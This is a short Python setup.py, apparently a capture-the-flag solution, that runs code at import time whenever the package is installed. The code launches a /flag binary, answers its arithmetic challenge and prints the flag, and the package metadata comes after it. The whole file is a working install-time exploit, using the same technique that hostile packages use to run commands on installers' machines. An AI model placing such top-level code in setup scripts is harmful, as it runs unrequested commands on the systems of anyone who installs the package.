# setup.py
import subprocess
import re

# Execute code at the top level
try:
    proc = subprocess.Popen(['/flag'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
    question = proc.stdout.readline()
    print(question)
    numbers = list(map(int, re.findall(r'\d+', question)))
    if len(numbers) == 3:
        A, B, C = numbers
        answer = A * B + C
        proc.stdin.write(f'{answer}\n')
        proc.stdin.flush()
        flag = proc.stdout.readline()
        print(flag)
    else:
        print('Failed to parse question')
except Exception as e:
    print(f"Error: {e}")

from setuptools import setup

setup(
    name='pyramid2_solution',
    version='0.0.7',  # Incremented version
    packages=['pyramid2_solution'],
)
